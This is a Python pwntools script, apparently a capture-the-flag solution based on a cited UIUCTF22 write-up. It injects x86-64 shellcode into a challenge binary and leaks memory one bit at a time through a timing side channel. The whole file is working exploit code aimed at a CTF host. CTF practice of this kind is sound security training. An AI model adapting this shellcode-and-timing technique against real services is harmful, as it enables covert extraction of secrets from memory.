#ref https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/UIUCTF22/no-syscalls-allowed.c
from pwn import *
ip = 'edu-ctf.zoolab.org' 
port = 10002
context.arch = 'amd64'

def get_a_bit(register, reg_offset, bit, local):
    if local == 1:
        target = process('./chal')
    else:
        target = remote(ip,port)
    payload = asm('mov al, BYTE PTR ds:[' + register + '+' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +
    ''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def get_a_byte(register, reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(get_a_bit(register, reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)